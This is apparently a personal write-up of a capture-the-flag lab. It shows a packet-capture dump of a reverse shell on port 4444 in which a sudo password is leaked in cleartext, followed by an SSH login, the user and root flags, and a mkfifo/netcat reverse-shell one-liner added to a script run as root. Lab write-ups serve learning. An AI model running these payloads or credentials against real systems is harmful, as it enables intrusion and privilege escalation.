+
+
+Fri Oct  2 12:41:16 2020 [16652]
+TCP  192.168.22.139:43948 --> 34.98.75.36:443 | AP (39)
+....".f.%..,.q.^...em.$>...
+..      ....$..q
+
+Fri Oct  2 12:41:16 2020 [17101]
+TCP  192.168.22.139:43948 --> 34.98.75.36:443 | AP (24)
+.....l.W&.l=.U.Ba.G..X..
+
+Fri Oct  2 12:41:16 2020 [17238]
+TCP  192.168.22.139:43948 --> 34.98.75.36:443 | FA (0)
+
+
+Fri Oct  2 12:41:16 2020 [17414]
+TCP  34.98.75.36:443 --> 192.168.22.139:43948 | A (0)
+
+
+Fri Oct  2 12:41:16 2020 [17414]
+TCP  34.98.75.36:443 --> 192.168.22.139:43948 | A (0)
+
+
+Fri Oct  2 12:41:16 2020 [17841]
+TCP  34.98.75.36:443 --> 192.168.22.139:43948 | A (0)
+
+
+Fri Oct  2 12:41:16 2020 [97482]
+TCP  34.98.75.36:443 --> 192.168.22.139:43948 | FAP (0)
+
+
+Fri Oct  2 12:41:16 2020 [97565]
+TCP  192.168.22.139:43948 --> 34.98.75.36:443 | A (0)
+
+
+Fri Oct  2 12:41:16 2020 [435386]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (10)
+cd lennie
+
+
+Fri Oct  2 12:41:16 2020 [439659]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (72)
+cd lennie.
+bash: cd: lennie: Permission denied.
+www-data@startup:/home$ 
+
+Fri Oct  2 12:41:16 2020 [439676]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:17 2020 [260711]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (3)
+ls
+
+
+Fri Oct  2 12:41:17 2020 [264130]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (4)
+ls.
+
+
+Fri Oct  2 12:41:17 2020 [264182]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:17 2020 [269310]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (6)
+lennie
+
+Fri Oct  2 12:41:17 2020 [269321]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:17 2020 [270440]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (26)
+.
+www-data@startup:/home$ 
+
+Fri Oct  2 12:41:17 2020 [270451]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:19 2020 [256679]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (10)
+cd lennie
+
+
+Fri Oct  2 12:41:19 2020 [260382]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (48)
+cd lennie.
+bash: cd: lennie: Permission denied.
+
+
+Fri Oct  2 12:41:19 2020 [260399]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:19 2020 [262561]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (24)
+www-data@startup:/home$ 
+
+Fri Oct  2 12:41:19 2020 [262572]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:25 2020 [151072]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | A (0)
+
+
+Fri Oct  2 12:41:25 2020 [152046]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | A (0)
+
+
+Fri Oct  2 12:41:33 2020 [666734]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (8)
+sudo -l
+
+
+Fri Oct  2 12:41:33 2020 [670131]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (9)
+sudo -l.
+
+
+Fri Oct  2 12:41:33 2020 [670148]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:33 2020 [683386]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (30)
+[sudo] password for www-data: 
+
+Fri Oct  2 12:41:33 2020 [683399]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:36 2020 [248419]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (19)
+c4ntg3t3n0ughsp1c3
+
+
+Fri Oct  2 12:41:36 2020 [251818]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (2)
+.
+
+
+Fri Oct  2 12:41:36 2020 [251836]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:38 2020 [406573]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (17)
+Sorry, try again.
+
+Fri Oct  2 12:41:38 2020 [406697]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:38 2020 [412195]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (2)
+.
+
+
+Fri Oct  2 12:41:38 2020 [412206]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:38 2020 [413577]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (30)
+[sudo] password for www-data: 
+
+Fri Oct  2 12:41:38 2020 [413588]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:41 2020 [399714]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (1)
+
+
+
+Fri Oct  2 12:41:41 2020 [401818]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (2)
+.
+
+
+Fri Oct  2 12:41:41 2020 [401834]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:43 2020 [160648]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (17)
+Sorry, try again.
+
+Fri Oct  2 12:41:43 2020 [160713]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:43 2020 [167546]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (2)
+.
+
+
+Fri Oct  2 12:41:43 2020 [167556]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:43 2020 [169351]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (30)
+[sudo] password for www-data: 
+
+Fri Oct  2 12:41:43 2020 [169362]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:45 2020 [70752]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (19)
+c4ntg3t3n0ughsp1c3
+
+
+Fri Oct  2 12:41:45 2020 [74923]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (2)
+.
+
+
+Fri Oct  2 12:41:45 2020 [74941]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:47 2020 [466483]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (37)
+sudo: 3 incorrect password attempts.
+
+
+Fri Oct  2 12:41:47 2020 [466542]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:47 2020 [471028]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (24)
+www-data@startup:/home$ 
+
+Fri Oct  2 12:41:47 2020 [471040]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:52 2020 [790962]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (16)
+cat /etc/passwd
+
+
+Fri Oct  2 12:41:52 2020 [795326]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (17)
+cat /etc/passwd.
+
+
+Fri Oct  2 12:41:52 2020 [795342]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:52 2020 [799920]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (1400)
+root:x:0:0:root:/root:/bin/bash.
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin.
+bin:x:2:2:bin:/bin:/usr/sbin/nologin.
+sys:x:3:3:sys:/dev:/usr/sbin/nologin.
+sync:x:4:65534:sync:/bin:/bin/sync.
+games:x:5:60:games:/usr/games:/usr/sbin/nologin.
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin.
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin.
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin.
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin.
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin.
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin.
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin.
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin.
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin.
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin.
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin.
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin.
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false.
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false.
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false.
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false.
+syslog:x:104:108::/home/syslog:/bin/false.
+_apt:x:105:65534::/nonexistent:/bin/false.
+lxd:x:106:65534::/var/lib/lxd/:/bin/false.
+messagebus:x:107:111::/var/run/dbus:/bin/false.
+uuid
+
+Fri Oct  2 12:41:52 2020 [799931]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:52 2020 [800698]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (394)
+d:x:108:112::/run/uuidd:/bin/false.
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false.
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin.
+pollinate:x:111:1::/var/cache/pollinate:/bin/false.
+vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash.
+ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false.
+lennie:x:1002:1002::/home/lennie:.
+ftpsecure:x:1003:1003::/home/ftpsecure:.
+www-data@startup:/home$ 
+
+Fri Oct  2 12:41:52 2020 [800709]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:55 2020 [952916]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (5)
+exit
+
+
+Fri Oct  2 12:41:55 2020 [963731]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (12)
+exit.
+exit.
+
+
+Fri Oct  2 12:41:55 2020 [963750]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:55 2020 [965209]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (2)
+$ 
+
+Fri Oct  2 12:41:55 2020 [965220]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:41:57 2020 [926740]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (5)
+exit
+
+
+Fri Oct  2 12:41:57 2020 [930421]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | FA (0)
+
+
+Fri Oct  2 12:41:57 2020 [930588]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | FA (0)
+
+
+Fri Oct  2 12:41:57 2020 [930599]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | A (0)
+
+
+Fri Oct  2 12:41:57 2020 [934657]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | AP (403)
+HTTP/1.1 200 OK.
+Date: Fri, 02 Oct 2020 17:40:21 GMT.
+Server: Apache/2.4.18 (Ubuntu).
+Vary: Accept-Encoding.
+Content-Encoding: gzip.
+Content-Length: 152.
+Keep-Alive: timeout=5, max=98.
+Connection: Keep-Alive.
+Content-Type: text/html; charset=UTF-8.
+.
+.............
+.0.D.....@.....J7.R.uHni ......:.....u..8..n.:2(.F...f..s....j.AG..T0..`QE9...5..T......I...    y%.vi7..;.y..0.c..J........[P(y.T!..~|.......
+
+Fri Oct  2 12:41:57 2020 [934728]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | A (0)
+
+
+Capture file read completely, please exit at your convenience.
+
+
+
+One of the file is :
+
+Fri Oct  2 12:41:36 2020 [248419]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (19)
+c4ntg3t3n0ughsp1c3
+
+
+
+
+
+
+
+                                                                                                   Logging in to lennies ssh
+                                                                                                                               
+┌──(kali㉿kali)-[~/Desktop/thm]
+└─$ ssh lennie@10.10.125.95                                                                                               255 ⨯
+lennie@10.10.125.95's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+44 packages can be updated.
+30 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+$ 
+
+$ ls
+Documents  scripts  user.txt
+$ cat user.txt
+THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
+$ 
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker ip 1234 >/tmp/f
+adding this to print.sh in lennie
+
+lennie@startup:/etc$ cat print.sh
+#!/bin/bash
+echo "Done!"
+lennie@startup:/etc$ vi print.sh
+./^HsudoHt remove '/tmp/f': No such file or directory
+                                                                                                                                
+sudo ./print.shlennie@startup:/etc$                                                                                             
+lennie@startup:/etc$                                                                                                            
+lennie@startup:/etc$                                                                                                            
+lennie@startup:/etc$                                                                                                            
+lennie@startup:/etc$ .sudo
+No command '.sudo' found, did you mean:                                                                                         
+ Command 'sudo' from package 'sudo-ldap' (universe)                                                                             
+ Command 'sudo' from package 'sudo' (main)                                                                                      
+.sudo: command not found                                                                                                        
+lennie@startup:/etc$ 
+lennie@startup:/etc$ sudo ./print.sh
+sudo: unable to resolve host startup
+[sudo] password for lennie: 
+
+
+At My end
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.8.131.147] from (UNKNOWN) [10.10.125.95] 43480
+/bin/sh: 0: can't access tty; job control turned off
+# ls
+root.txt
+# cat root.txt
+THM{f963aaa6a430f210222158ae15c3d76d}
+# 
+
+Finally machine is solved Jai mata di !!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
